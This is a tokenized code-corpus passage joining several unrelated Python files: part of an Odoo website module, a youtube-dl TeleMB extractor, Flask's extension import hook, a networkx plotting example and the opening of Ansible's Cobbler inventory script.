1 ) ) , 'num' : min ( pmax , page + 1 ) } , "page_end" : { 'url' : get_url ( pmax ) , 'num' : pmax } , "pages" : [ { 'url' : get_url ( page ) , 'num' : page } for page in xrange ( pmin , pmax + 1 ) ] } <newline> <dedent> def rule_is_enumerable ( self , rule ) : <newline> <indent>  """ ▁ Checks ▁ that ▁ it ▁ is ▁ possible ▁ to ▁ generate ▁ sensible ▁ GET ▁ queries ▁ for <strnewline> ▁ a ▁ given ▁ rule ▁ (if ▁ the ▁ endpoint ▁ matches ▁ its ▁ own ▁ requirements) <strnewline> <strnewline> ▁ :type ▁ rule: ▁ werkzeug.routing.Rule <strnewline> ▁ :rtype: ▁ bool <strnewline> ▁ """  <newline> endpoint = rule . endpoint <newline> methods = endpoint . routing . get ( 'methods' ) or [ 'GET' ] <newline> converters = rule . _converters . values ( ) <newline> if not ( 'GET' in methods and endpoint . routing [ 'type' ] == 'http' and endpoint . routing [ 'auth' ] in ( 'none' , 'public' ) and endpoint . routing . get ( 'website' , False ) and all ( hasattr ( converter , 'generate' ) for converter in converters ) and endpoint . routing . get ( 'website' ) ) : <newline> <indent> return False <newline>  # ▁ dont't ▁ list ▁ routes ▁ without ▁ argument ▁ having ▁ no ▁ default ▁ value ▁ or ▁ converter <encdom> <dedent> spec = inspect . getargspec ( endpoint . method . original_func ) <newline>  # ▁ remove ▁ self ▁ and ▁ arguments ▁ having ▁ a ▁ default ▁ value <encdom> defaults_count = len ( spec . defaults or [ ] ) <newline> args = spec . args [ 1 : ( - defaults_count or None ) ] <newline>  # ▁ check ▁ that ▁ all ▁ args ▁ have ▁ a ▁ converter <encdom> return all ( ( arg in rule . _converters ) for arg in args ) <newline> <dedent> def enumerate_pages ( self , cr , uid , ids , query_string = None , context = None ) : <newline> <indent>  """ ▁ Available ▁ pages ▁ in ▁ the ▁ website/CMS. ▁ This ▁ is ▁ mostly ▁ used ▁ for ▁ links <strnewline> ▁ generation ▁ and ▁ can ▁ be ▁ overridden ▁ by ▁ modules ▁ setting ▁ up ▁ new ▁ HTML <strnewline> ▁ controllers ▁ for ▁ dynamic ▁ pages ▁ (e.g. ▁ blog). <strnewline> <strnewline> ▁ By ▁ default, ▁ returns ▁ template ▁ views ▁ marked ▁ as ▁ pages. <strnewline> <strnewline> ▁ :param ▁ str ▁ query_string: ▁ a ▁ (user-provided) ▁ string, ▁ fetches ▁ pages <strnewline> ▁ matching ▁ the ▁ string <strnewline> ▁ :returns: ▁ a ▁ list ▁ of ▁ mappings ▁ with ▁ two ▁ keys: ▁ ``name`` ▁ is ▁ the ▁ displayable <strnewline> ▁ name ▁ of ▁ the ▁ resource ▁ (page), ▁ ``url`` ▁ is ▁ the ▁ absolute ▁ URL <strnewline> ▁ of ▁ the ▁ same. <strnewline> ▁ :rtype: ▁ list({name: ▁ str, ▁ url: ▁ str}) <strnewline> ▁ """  <newline> router = request . httprequest . app . get_db_router ( request . db ) <newline>  # ▁ Force ▁ enumeration ▁ to ▁ be ▁ performed ▁ as ▁ public ▁ user <encdom> url_set = set ( ) <newline> for rule in router . iter_rules ( ) : <newline> <indent> if not self . rule_is_enumerable ( rule ) : <newline> <indent> continue <newline> <dedent> converters = rule . _converters or { } <newline> if query_string and not converters and ( query_string not in rule . build ( [ { } ] , append_unknown = False ) [ 1 ] ) : <newline> <indent> continue <newline> <dedent> values = [ { } ] <newline> convitems = converters . items ( ) <newline>  # ▁ converters ▁ with ▁ a ▁ domain ▁ are ▁ processed ▁ after ▁ the ▁ other ▁ ones <encdom> gd = lambda x : hasattr ( x [ 1 ] , 'domain' ) and ( x [ 1 ] . domain < > '[]' ) <newline> convitems . sort ( lambda x , y : cmp ( gd ( x ) , gd ( y ) ) ) <newline> for ( i , ( name , converter ) ) in enumerate ( convitems ) : <newline> <indent> newval = [ ] <newline> for val in values : <newline> <indent> query = i == ( len ( convitems ) - 1 ) and query_string <newline> for v in converter . generate ( request . cr , uid , query = query , args = val , context = context ) : <newline> <indent> newval . append ( val . copy ( ) ) <newline> v [ name ] = v [ 'loc' ] <newline> del v [ 'loc' ] <newline> newval [ - 1 ] . update ( v ) <newline> <dedent> <dedent> values = newval <newline> <dedent> for value in values : <newline> <indent> domain_part , url = rule . build ( value , append_unknown = False ) <newline> page = { 'loc' : url } <newline> for key , val in value . items ( ) : <newline> <indent> if key . startswith ( '__' ) : <newline> <indent> page [ key [ 2 : ] ] = val <newline> <dedent> <dedent> if url in ( '/sitemap.xml' , ) : <newline> <indent> continue <newline> <dedent> if url in url_set : <newline> <indent> continue <newline> <dedent> url_set . add ( url ) <newline> yield page <newline> <dedent> <dedent> <dedent> def search_pages ( self , cr , uid , ids , needle = None , limit = None , context = None ) : <newline> <indent> name = re . sub ( r"^/p(a(g(e(/(w(e(b(s(i(t(e(\.)?)?)?)?)?)?)?)?)?)?)?)?" , "" , needle or "" ) <newline> res = [ ] <newline> for page in self . enumerate_pages ( cr , uid , ids , query_string = name , context = context ) : <newline> <indent> if needle in page [ 'loc' ] : <newline> <indent> res . append ( page ) <newline> if len ( res ) == limit : <newline> <indent> break <newline> <dedent> <dedent> <dedent> return res <newline> <dedent> def image_url ( self , cr , uid , record , field , size = None , context = None ) : <newline> <indent>  """ Returns ▁ a ▁ local ▁ url ▁ that ▁ points ▁ to ▁ the ▁ image ▁ field ▁ of ▁ a ▁ given ▁ browse ▁ record. """  <newline> sudo_record = record . sudo ( ) <newline> sha = hashlib . sha1 ( getattr ( sudo_record , '__last_update' ) ) . hexdigest ( ) [ 0 : 7 ] <newline> size = '' if size is None else '/%s' % size <newline> return '/web/image/%s/%s/%s%s?unique=%s' % ( record . _name , record . id , field , size , sha ) <newline> <dedent> <dedent> class website_menu ( osv . osv ) : <newline> <indent> _name = "website.menu" <newline> _description = "Website ▁ Menu" <newline> _columns = { 'name' : fields . char ( 'Menu' , required = True , translate = True ) , 'url' : fields . char ( 'Url' ) , 'new_window' : fields . boolean ( 'New ▁ Window' ) , 'sequence' : fields . integer ( 'Sequence' ) ,  # ▁ TODO: ▁ support ▁ multiwebsite ▁ once ▁ done ▁ for ▁ ir.ui.views <encdom> 'website_id' : fields . many2one ( 'website' , 'Website' ) , 'parent_id' : fields . many2one ( 'website.menu' , 'Parent ▁ Menu' , select = True , ondelete = "cascade" ) , 'child_id' : fields . one2many ( 'website.menu' , 'parent_id' , string = 'Child ▁ Menus' ) , 'parent_left' : fields . integer ( 'Parent ▁ Left' , select = True ) , 'parent_right' : fields . integer ( 'Parent ▁ Right' , select = True ) , } <newline> def __defaults_sequence ( self , cr , uid , context ) : <newline> <indent> menu = self . search_read ( cr , uid , [ ( 1 , "=" , 1 ) ] , [ "sequence" ] , limit = 1 , order = "sequence ▁ DESC" , context = context ) <newline> return menu and menu [ 0 ] [ "sequence" ] or 0 <newline> <dedent> _defaults = { 'url' : '' , 'sequence' : __defaults_sequence , 'new_window' : False , } <newline> _parent_store = True <newline> _parent_order = 'sequence' <newline> _order = "sequence" <newline>  # ▁ would ▁ be ▁ better ▁ to ▁ take ▁ a ▁ menu_id ▁ as ▁ argument <encdom> def get_tree ( self , cr , uid , website_id , menu_id = None , context = None ) : <newline> <indent> def make_tree ( node ) : <newline> <indent> menu_node = dict ( id = node . id , name = node . name , url = node . url , new_window = node . new_window , sequence = node . sequence , parent_id = node . parent_id . id , children = [ ] , ) <newline> for child in node . child_id : <newline> <indent> menu_node [ 'children' ] . append ( make_tree ( child ) ) <newline> <dedent> return menu_node <newline> <dedent> if menu_id : <newline> <indent> menu = self . browse ( cr , uid , menu_id , context = context ) <newline> <dedent> else : <newline> <indent> menu = self . pool . get ( 'website' ) . browse ( cr , uid , website_id , context = context ) . menu_id <newline> <dedent> return make_tree ( menu ) <newline> <dedent> def save ( self , cr , uid , website_id , data , context = None ) : <newline> <indent> def replace_id ( old_id , new_id ) : <newline> <indent> for menu in data [ 'data' ] : <newline> <indent> if menu [ 'id' ] == old_id : <newline> <indent> menu [ 'id' ] = new_id <newline> <dedent> if menu [ 'parent_id' ] == old_id : <newline> <indent> menu [ 'parent_id' ] = new_id <newline> <dedent> <dedent> <dedent> to_delete = data [ 'to_delete' ] <newline> if to_delete : <newline> <indent> self . unlink ( cr , uid , to_delete , context = context ) <newline> <dedent> for menu in data [ 'data' ] : <newline> <indent> mid = menu [ 'id' ] <newline> if isinstance ( mid , basestring ) : <newline> <indent> new_id = self . create ( cr , uid , { 'name' : menu [ 'name' ] } , context = context ) <newline> replace_id ( mid , new_id ) <newline> <dedent> <dedent> for menu in data [ 'data' ] : <newline> <indent> self . write ( cr , uid , [ menu [ 'id' ] ] , menu , context = context ) <newline> <dedent> return True <newline> <dedent> <dedent> class ir_attachment ( osv . osv ) : <newline> <indent> _inherit = "ir.attachment" <newline> _columns = { 'website_url' : fields . related ( "local_url" , string = "Attachment ▁ URL" , type = 'char' , deprecated = True ) ,  # ▁ related ▁ for ▁ backward ▁ compatibility ▁ with ▁ saas-6 <encdom> } <newline> <dedent> class res_partner ( osv . osv ) : <newline> <indent> _inherit = "res.partner" <newline> def google_map_img ( self , cr , uid , ids , zoom = 8 , width = 298 , height = 298 , context = None ) : <newline> <indent> partner = self . browse ( cr , uid , ids [ 0 ] , context = context ) <newline> params = { 'center' : '%s, ▁ %s ▁ %s, ▁ %s' % ( partner . street or '' , partner . city or '' , partner . zip or '' , partner . country_id and partner . country_id . name_get ( ) [ 0 ] [ 1 ] or '' ) , 'size' : "%sx%s" % ( height , width ) , 'zoom' : zoom , 'sensor' : 'false' , } <newline> google_maps_api_key = self . pool [ 'ir.config_parameter' ] . get_param ( cr , openerp . SUPERUSER_ID , 'google_maps_api_key' , context = context ) <newline> if google_maps_api_key : <newline> <indent> params [ 'key' ] = google_maps_api_key <newline> <dedent> return urlplus ( '//maps.googleapis.com/maps/api/staticmap' , params ) <newline> <dedent> def google_map_link ( self , cr , uid , ids , zoom = 10 , context = None ) : <newline> <indent> partner = self . browse ( cr , uid , ids [ 0 ] , context = context ) <newline> params = { 'q' : '%s, ▁ %s ▁ %s, ▁ %s' % ( partner . street or '' , partner . city or '' , partner . zip or '' , partner . country_id and partner . country_id . name_get ( ) [ 0 ] [ 1 ] or '' ) , 'z' : zoom , } <newline> return urlplus ( 'https://maps.google.com/maps' , params ) <newline> <dedent> <dedent> class res_company ( osv . osv ) : <newline> <indent> _inherit = "res.company" <newline> def google_map_img ( self , cr , uid , ids , zoom = 8 , width = 298 , height = 298 , context = None ) : <newline> <indent> partner = self . browse ( cr , openerp . SUPERUSER_ID , ids [ 0 ] , context = context ) . partner_id <newline> return partner and partner . google_map_img ( zoom , width , height , context = context ) or None <newline> <dedent> def google_map_link ( self , cr , uid , ids , zoom = 8 , context = None ) : <newline> <indent> partner = self . browse ( cr , openerp . SUPERUSER_ID , ids [ 0 ] , context = context ) . partner_id <newline> return partner and partner . google_map_link ( zoom , context = context ) or None <newline> <dedent> <dedent> class base_language_install ( osv . osv_memory ) : <newline> <indent> _inherit = "base.language.install" <newline> _columns = { 'website_ids' : fields . many2many ( 'website' , string = 'Websites ▁ to ▁ translate' ) , } <newline> def default_get ( self , cr , uid , fields , context = None ) : <newline> <indent> if context is None : <newline> <indent> context = { } <newline> <dedent> defaults = super ( base_language_install , self ) . default_get ( cr , uid , fields , context ) <newline> website_id = context . get ( 'params' , { } ) . get ( 'website_id' ) <newline> if website_id : <newline> <indent> if 'website_ids' not in defaults : <newline> <indent> defaults [ 'website_ids' ] = [ ] <newline> <dedent> defaults [ 'website_ids' ] . append ( website_id ) <newline> <dedent> return defaults <newline> <dedent> def lang_install ( self , cr , uid , ids , context = None ) : <newline> <indent> if context is None : <newline> <indent> context = { } <newline> <dedent> action = super ( base_language_install , self ) . lang_install ( cr , uid , ids , context ) <newline> language_obj = self . browse ( cr , uid , ids ) [ 0 ] <newline> website_ids = [ website . id for website in language_obj [ 'website_ids' ] ] <newline> lang_id = self . pool [ 'res.lang' ] . search ( cr , uid , [ ( 'code' , '=' , language_obj [ 'lang' ] ) ] ) <newline> if website_ids and lang_id : <newline> <indent> data = { 'language_ids' : [ ( 4 , lang_id [ 0 ] ) ] } <newline> self . pool [ 'website' ] . write ( cr , uid , website_ids , data ) <newline> <dedent> params = context . get ( 'params' , { } ) <newline> if 'url_return' in params : <newline> <indent> return { 'url' : params [ 'url_return' ] . replace ( '[lang]' , language_obj [ 'lang' ] ) , 'type' : 'ir.actions.act_url' , 'target' : 'self' } <newline> <dedent> return action <newline> <dedent> <dedent> class website_seo_metadata ( osv . Model ) : <newline> <indent> _name = 'website.seo.metadata' <newline> _description = 'SEO ▁ metadata' <newline> _columns = { 'website_meta_title' : fields . char ( "Website ▁ meta ▁ title" , translate = True ) , 'website_meta_description' : fields . text ( "Website ▁ meta ▁ description" , translate = True ) , 'website_meta_keywords' : fields . char ( "Website ▁ meta ▁ keywords" , translate = True ) , } <newline> <dedent> class website_published_mixin ( osv . AbstractModel ) : <newline> <indent> _name = "website.published.mixin" <newline> _website_url_proxy = lambda self , * a , ** kw : self . _website_url ( * a , ** kw ) <newline> _columns = { 'website_published' : fields . boolean ( 'Visible ▁ in ▁ Website' , copy = False ) , 'website_url' : fields . function ( _website_url_proxy , type = 'char' , string = 'Website ▁ URL' , help = 'The ▁ full ▁ URL ▁ to ▁ access ▁ the ▁ document ▁ through ▁ the ▁ website.' ) , } <newline> def _website_url ( self , cr , uid , ids , field_name , arg , context = None ) : <newline> <indent> return dict . fromkeys ( ids , ' # ' ) <newline> <dedent> def website_publish_button ( self , cr , uid , ids , context = None ) : <newline> <indent> for i in self . browse ( cr , uid , ids , context ) : <newline> <indent> if self . pool [ 'res.users' ] . has_group ( cr , uid , 'base.group_website_publisher' ) and i . website_url != ' # ' : <newline> <indent> return self . open_website_url ( cr , uid , ids , context ) <newline> <dedent> i . write ( { 'website_published' : not i . website_published } ) <newline> <dedent> return True <newline> <dedent> def open_website_url ( self , cr , uid , ids , context = None ) : <newline> <indent> return { 'type' : 'ir.actions.act_url' , 'url' : self . browse ( cr , uid , ids [ 0 ] ) . website_url , 'target' : 'self' , } <newline> <dedent> <dedent>
 # ▁ coding: ▁ utf-8 <encdom> from __future__ import unicode_literals <newline> import re <newline> from . common import InfoExtractor <newline> from . . utils import remove_start <newline> class TeleMBIE ( InfoExtractor ) : <newline> <indent> _VALID_URL = r'https?://(?:www\.)?telemb\.be/(?P<display_id>.+?)_d_(?P<id>\d+)\.html' <newline> _TESTS = [ { 'url' : 'http://www.telemb.be/mons-cook-with-danielle-des-cours-de-cuisine-en-anglais-_d_13466.html' , 'md5' : 'f45ea69878516ba039835794e0f8f783' , 'info_dict' : { 'id' : '13466' , 'display_id' : 'mons-cook-with-danielle-des-cours-de-cuisine-en-anglais-' , 'ext' : 'mp4' , 'title' : 'Mons ▁ - ▁ Cook ▁ with ▁ Danielle ▁ : ▁ des ▁ cours ▁ de ▁ cuisine ▁ en ▁ anglais ▁ ! ▁ - ▁ Les ▁ reportages' , 'description' : 'md5:bc5225f47b17c309761c856ad4776265' , 'thumbnail' : 're:^http://.*\.(?:jpg|png)$' , } } , {  # ▁ non-ASCII ▁ characters ▁ in ▁ download ▁ URL <encdom> 'url' : 'http://telemb.be/les-reportages-havre-incendie-mortel_d_13514.html' , 'md5' : '6e9682736e5ccd4eab7f21e855350733' , 'info_dict' : { 'id' : '13514' , 'display_id' : 'les-reportages-havre-incendie-mortel' , 'ext' : 'mp4' , 'title' : 'Havré ▁ - ▁ Incendie ▁ mortel ▁ - ▁ Les ▁ reportages' , 'description' : 'md5:5e54cb449acb029c2b7734e2d946bd4a' , 'thumbnail' : 're:^http://.*\.(?:jpg|png)$' , } } , ] <newline> def _real_extract ( self , url ) : <newline> <indent> mobj = re . match ( self . _VALID_URL , url ) <newline> video_id = mobj . group ( 'id' ) <newline> display_id = mobj . group ( 'display_id' ) <newline> webpage = self . _download_webpage ( url , display_id ) <newline> formats = [ ] <newline> for video_url in re . findall ( r'file\s*:\s*"([^"]+)"' , webpage ) : <newline> <indent> fmt = { 'url' : video_url , 'format_id' : video_url . split ( ':' ) [ 0 ] } <newline> rtmp = re . search ( r'^(?P<url>rtmp://[^/]+/(?P<app>.+))/(?P<playpath>mp4:.+)$' , video_url ) <newline> if rtmp : <newline> <indent> fmt . update ( { 'play_path' : rtmp . group ( 'playpath' ) , 'app' : rtmp . group ( 'app' ) , 'player_url' : 'http://p.jwpcdn.com/6/10/jwplayer.flash.swf' , 'page_url' : 'http://www.telemb.be' , 'preference' : - 1 , } ) <newline> <dedent> formats . append ( fmt ) <newline> <dedent> self . _sort_formats ( formats ) <newline> title = remove_start ( self . _og_search_title ( webpage ) , 'TéléMB ▁ : ▁ ' ) <newline> description = self . _html_search_regex ( r'<meta ▁ property="og:description" ▁ content="(.+?)" ▁ />' , webpage , 'description' , fatal = False ) <newline> thumbnail = self . _og_search_thumbnail ( webpage ) <newline> return { 'id' : video_id , 'display_id' : display_id , 'title' : title , 'description' : description , 'thumbnail' : thumbnail , 'formats' : formats , } <newline> <dedent> <dedent>
 # ▁ -*- ▁ coding: ▁ utf-8 ▁ -*- <encdom>  """ <strnewline> ▁ flask.exthook <strnewline> ▁ ~~~~~ <strnewline> <strnewline> ▁ Redirect ▁ imports ▁ for ▁ extensions. ▁ This ▁ module ▁ basically ▁ makes ▁ it ▁ possible <strnewline> ▁ for ▁ us ▁ to ▁ transition ▁ from ▁ flaskext.foo ▁ to ▁ flask_foo ▁ without ▁ having ▁ to <strnewline> ▁ force ▁ all ▁ extensions ▁ to ▁ upgrade ▁ at ▁ the ▁ same ▁ time. <strnewline> <strnewline> ▁ When ▁ a ▁ user ▁ does ▁ ``from ▁ flask.ext.foo ▁ import ▁ bar`` ▁ it ▁ will ▁ attempt ▁ to <strnewline> ▁ import ▁ ``from ▁ flask_foo ▁ import ▁ bar`` ▁ first ▁ and ▁ when ▁ that ▁ fails ▁ it ▁ will <strnewline> ▁ try ▁ to ▁ import ▁ ``from ▁ flaskext.foo ▁ import ▁ bar``. <strnewline> <strnewline> ▁ We're ▁ switching ▁ from ▁ namespace ▁ packages ▁ because ▁ it ▁ was ▁ just ▁ too ▁ painful ▁ for <strnewline> ▁ everybody ▁ involved. <strnewline> <strnewline> ▁ This ▁ is ▁ used ▁ by ▁ `flask.ext`. <strnewline> <strnewline> ▁ :copyright: ▁ (c) ▁ 2011 ▁ by ▁ Armin ▁ Ronacher. <strnewline> ▁ :license: ▁ BSD, ▁ see ▁ LICENSE ▁ for ▁ more ▁ details. <strnewline> """  <newline> import sys <newline> import os <newline> from . _compat import reraise <newline> class ExtensionImporter ( object ) : <newline> <indent>  """ This ▁ importer ▁ redirects ▁ imports ▁ from ▁ this ▁ submodule ▁ to ▁ other ▁ locations. <strnewline> ▁ This ▁ makes ▁ it ▁ possible ▁ to ▁ transition ▁ from ▁ the ▁ old ▁ flaskext.name ▁ to ▁ the <strnewline> ▁ newer ▁ flask_name ▁ without ▁ people ▁ having ▁ a ▁ hard ▁ time. <strnewline> ▁ """  <newline> def __init__ ( self , module_choices , wrapper_module ) : <newline> <indent> self . module_choices = module_choices <newline> self . wrapper_module = wrapper_module <newline> self . prefix = wrapper_module + '.' <newline> self . prefix_cutoff = wrapper_module . count ( '.' ) + 1 <newline> <dedent> def __eq__ ( self , other ) : <newline> <indent> return self . __class__ . __module__ == other . __class__ . __module__ and self . __class__ . __name__ == other . __class__ . __name__ and self . wrapper_module == other . wrapper_module and self . module_choices == other . module_choices <newline> <dedent> def __ne__ ( self , other ) : <newline> <indent> return not self . __eq__ ( other ) <newline> <dedent> def install ( self ) : <newline> <indent> sys . meta_path [ : ] = [ x for x in sys . meta_path if self != x ] + [ self ] <newline> <dedent> def find_module ( self , fullname , path = None ) : <newline> <indent> if fullname . startswith ( self . prefix ) : <newline> <indent> return self <newline> <dedent> <dedent> def load_module ( self , fullname ) : <newline> <indent> if fullname in sys . modules : <newline> <indent> return sys . modules [ fullname ] <newline> <dedent> modname = fullname . split ( '.' , self . prefix_cutoff ) [ self . prefix_cutoff ] <newline> for path in self . module_choices : <newline> <indent> realname = path % modname <newline> try : <newline> <indent> __import__ ( realname ) <newline> <dedent> except ImportError : <newline> <indent> exc_type , exc_value , tb = sys . exc_info ( ) <newline>  # ▁ since ▁ we ▁ only ▁ establish ▁ the ▁ entry ▁ in ▁ sys.modules ▁ at ▁ the <encdom>  # ▁ very ▁ this ▁ seems ▁ to ▁ be ▁ redundant, ▁ but ▁ if ▁ recursive ▁ imports <encdom>  # ▁ happen ▁ we ▁ will ▁ call ▁ into ▁ the ▁ move ▁ import ▁ a ▁ second ▁ time. <encdom>  # ▁ On ▁ the ▁ second ▁ invocation ▁ we ▁ still ▁ don't ▁ have ▁ an ▁ entry ▁ for <encdom>  # ▁ fullname ▁ in ▁ sys.modules, ▁ but ▁ we ▁ will ▁ end ▁ up ▁ with ▁ the ▁ same <encdom>  # ▁ fake ▁ module ▁ name ▁ and ▁ that ▁ import ▁ will ▁ succeed ▁ since ▁ this <encdom>  # ▁ one ▁ already ▁ has ▁ a ▁ temporary ▁ entry ▁ in ▁ the ▁ modules ▁ dict. <encdom>  # ▁ Since ▁ this ▁ one ▁"succeeded" ▁ temporarily ▁ that ▁ second <encdom>  # ▁ invocation ▁ now ▁ will ▁ have ▁ created ▁ a ▁ fullname ▁ entry ▁ in <encdom>  # ▁ sys.modules ▁ which ▁ we ▁ have ▁ to ▁ kill. <encdom> sys . modules . pop ( fullname , None ) <newline>  # ▁ If ▁ it's ▁ an ▁ important ▁ traceback ▁ we ▁ reraise ▁ it, ▁ otherwise <encdom>  # ▁ we ▁ swallow ▁ it ▁ and ▁ try ▁ the ▁ next ▁ choice. ▁ The ▁ skipped ▁ frame <encdom>  # ▁ is ▁ the ▁ one ▁ from ▁ __import__ ▁ above ▁ which ▁ we ▁ don't ▁ care ▁ about <encdom> if self . is_important_traceback ( realname , tb ) : <newline> <indent> reraise ( exc_type , exc_value , tb . tb_next ) <newline> <dedent> continue <newline> <dedent> module = sys . modules [ fullname ] = sys . modules [ realname ] <newline> if '.' not in modname : <newline> <indent> setattr ( sys . modules [ self . wrapper_module ] , modname , module ) <newline> <dedent> return module <newline> <dedent> raise ImportError ( 'No ▁ module ▁ named ▁ %s' % fullname ) <newline> <dedent> def is_important_traceback ( self , important_module , tb ) : <newline> <indent>  """ Walks ▁ a ▁ traceback's ▁ frames ▁ and ▁ checks ▁ if ▁ any ▁ of ▁ the ▁ frames <strnewline> ▁ originated ▁ in ▁ the ▁ given ▁ important ▁ module. ▁ If ▁ that ▁ is ▁ the ▁ case ▁ then ▁ we <strnewline> ▁ were ▁ able ▁ to ▁ import ▁ the ▁ module ▁ itself ▁ but ▁ apparently ▁ something ▁ went <strnewline> ▁ wrong ▁ when ▁ the ▁ module ▁ was ▁ imported. ▁ (Eg: ▁ import ▁ of ▁ an ▁ import ▁ failed). <strnewline> ▁ """  <newline> while tb is not None : <newline> <indent> if self . is_important_frame ( important_module , tb ) : <newline> <indent> return True <newline> <dedent> tb = tb . tb_next <newline> <dedent> return False <newline> <dedent> def is_important_frame ( self , important_module , tb ) : <newline> <indent>  """ Checks ▁ a ▁ single ▁ frame ▁ if ▁ it's ▁ important. """  <newline> g = tb . tb_frame . f_globals <newline> if '__name__' not in g : <newline> <indent> return False <newline> <dedent> module_name = g [ '__name__' ] <newline>  # ▁ Python ▁ 2.7 ▁ Behavior. ▁ Modules ▁ are ▁ cleaned ▁ up ▁ late ▁ so ▁ the <encdom>  # ▁ name ▁ shows ▁ up ▁ properly ▁ here. ▁ Success! <encdom> if module_name == important_module : <newline> <indent> return True <newline>  # ▁ Some ▁ python ▁ versions ▁ will ▁ will ▁ clean ▁ up ▁ modules ▁ so ▁ early ▁ that ▁ the <encdom>  # ▁ module ▁ name ▁ at ▁ that ▁ point ▁ is ▁ no ▁ longer ▁ set. ▁ Try ▁ guessing ▁ from <encdom>  # ▁ the ▁ filename ▁ then. <encdom> <dedent> filename = os . path . abspath ( tb . tb_frame . f_code . co_filename ) <newline> test_string = os . path . sep + important_module . replace ( '.' , os . path . sep ) <newline> return test_string + '.py' in filename or test_string + os . path . sep + '__init__.py' in filename <newline> <dedent> <dedent>
 # !/usr/bin/env ▁ python <encdom>  """ <strnewline> Draw ▁ a ▁ graph ▁ with ▁ matplotlib. <strnewline> You ▁ must ▁ have ▁ matplotlib ▁ for ▁ this ▁ to ▁ work. <strnewline> """  <newline> try : <newline> <indent> import matplotlib . pyplot as plt <newline> <dedent> except : <newline> <indent> raise <newline> <dedent> import networkx as nx <newline> G = nx . path_graph ( 8 ) <newline> nx . draw ( G ) <newline> plt . savefig ( "simple_path.png" )  # ▁ save ▁ as ▁ png <encdom> <newline> plt . show ( )  # ▁ display <encdom> <newline>
 # !/usr/bin/env ▁ python <encdom>  """ <strnewline> Cobbler ▁ external ▁ inventory ▁ script <strnewline> ===== <strnewline> <strnewline> Ansible ▁ has ▁ a ▁ feature ▁ where ▁ instead ▁ of ▁ reading ▁ from ▁ /etc/ansible/hosts <strnewline> as ▁ a ▁ text ▁ file, ▁ it ▁ can ▁ query ▁ external ▁ programs ▁ to ▁ obtain ▁ the ▁ list <strnewline> of ▁ hosts, ▁ groups ▁ the ▁ hosts ▁ are ▁ in, ▁ and ▁ even ▁ variables ▁ to ▁ assign ▁ to ▁ each ▁ host. <strnewline> <strnewline> To ▁ use ▁ this, ▁ copy ▁ this ▁ file ▁ over ▁ /etc/ansible/hosts ▁ and ▁ chmod ▁ +x ▁ the ▁ file. <strnewline> This, ▁ more ▁ or ▁ less, ▁ allows ▁ you ▁ to ▁ keep ▁ one ▁ central ▁ database ▁ containing <strnewline> info ▁ about ▁ all ▁ of ▁ your ▁ managed ▁ instances. <strnewline> <strnewline> This ▁ script ▁ is ▁ an ▁ example ▁ of ▁ sourcing ▁ that ▁ data ▁ from ▁ Cobbler <strnewline> (http://cobbler.github.com). ▁ With ▁ cobbler ▁ each ▁ --mgmt-class ▁ in ▁ cobbler <strnewline> will ▁ correspond ▁ to ▁ a ▁ group ▁ in ▁ Ansible, ▁ and ▁ --ks-meta ▁ variables ▁ will ▁ be <strnewline> passed ▁ down ▁ for ▁ use ▁ in ▁ templates ▁ or ▁ even ▁ in ▁ argument ▁ lines. <strnewline> <strnewline> NOTE: ▁ The ▁ cobbler ▁ system ▁ names ▁ will ▁ not ▁ be ▁ used. ▁ Make ▁ sure ▁ a <strnewline> cobbler ▁ --dns-name ▁ is ▁ set ▁ for ▁ each ▁ cobbler ▁ system. ▁ If ▁ a ▁ system <strnewline> appears ▁ with ▁ two ▁ DNS ▁ names ▁ we ▁ do ▁ not ▁ add ▁ it ▁ twice ▁ because ▁ we ▁ don't ▁ want <strnewline> ansible ▁ talking ▁ to ▁ it ▁ twice. ▁ The ▁ first ▁ one ▁ found ▁ will ▁ be ▁ used. ▁ If ▁ no <strnewline> --dns-name ▁ is ▁ set ▁ the ▁ system ▁ will ▁ NOT ▁ be ▁ visible ▁ to ▁ ansible. ▁ We ▁ do <strnewline> not ▁ add ▁ cobbler ▁ system ▁ names ▁ because ▁ there ▁ is ▁ no ▁ requirement ▁ in ▁ cobbler <strnewline> that ▁ those ▁ correspond ▁ to ▁ addresses. <strnewline> <strnewline> See ▁ http://ansible.github.com/api.html ▁ for ▁ more ▁ info <strnewline> <strnewline> Tested ▁ with ▁ Cobbler ▁ 2.0.11. <strnewline> <strnewline> Changelog: <strnewline> ▁ - ▁ 2015-06-21 ▁ dmccue: ▁ Modified ▁ to ▁ support ▁ run-once ▁ _meta ▁ retrieval, ▁ results ▁ in <strnewline> ▁ higher ▁ performance ▁ at ▁ ansible ▁ startup. ▁ Groups ▁ are ▁ determined ▁ by ▁ owner ▁ rather ▁ than <strnewline> ▁ default ▁ mgmt_classes. ▁ DNS ▁ name ▁ determined ▁ from ▁ hostname. ▁ cobbler ▁ values ▁ are ▁ written <strnewline> ▁ to ▁ a ▁'cobbler' ▁ fact ▁ namespace <strnewline> <strnewline> ▁ - ▁ 2013-09-01 ▁ pgehres: ▁ Refactored ▁ implementation ▁ to ▁ make ▁ use ▁ of ▁ caching ▁ and ▁ to <strnewline> ▁ limit ▁ the ▁ number ▁ of ▁ connections ▁ to ▁ external ▁ cobbler ▁ server ▁ for ▁ performance. <strnewline> ▁ Added ▁ use ▁ of ▁ cobbler.ini ▁ file ▁ to ▁ configure ▁ settings. ▁ Tested ▁ with ▁ Cobbler ▁ 2.4.0 <strnewline> <strnewline> """  <newline>  # ▁ (c) ▁ 2012, ▁ Michael ▁ DeHaan ▁ <michael.dehaan@gmail.com> <encdom>  # ▁ This ▁ file ▁ is ▁ part ▁ of ▁ Ansible, <encdom>  # ▁ Ansible ▁ is ▁ free ▁ software: ▁ you ▁ can ▁ redistribute ▁ it ▁ and/or ▁ modify <encdom>  # ▁ it ▁ under ▁ the ▁ terms ▁ of ▁ the ▁ GNU ▁ General ▁ Public ▁ License ▁ as ▁ published ▁ by <encdom>  # ▁ the ▁ Free ▁ Software ▁ Foundation, ▁ either ▁ version ▁ 3 ▁ of ▁ the ▁ License, ▁ or <encdom>  # ▁ (at ▁ your ▁ option) ▁ any ▁ later ▁ version. <encdom>  # ▁ Ansible ▁ is ▁ distributed ▁ in ▁ the ▁ hope ▁ that ▁ it ▁ will ▁ be ▁ useful, <encdom>  # ▁ but ▁ WITHOUT ▁ ANY ▁ WARRANTY; ▁ without ▁ even ▁ the ▁ implied ▁ warranty ▁ of <encdom>  # ▁ MERCHANTABILITY ▁ or ▁ FITNESS ▁ FOR ▁ A ▁ PARTICULAR ▁ PURPOSE. ▁ See ▁ the <encdom>  # ▁ GNU ▁ General ▁ Public ▁ License ▁ for ▁ more ▁ details. <encdom>  # ▁ You ▁ should 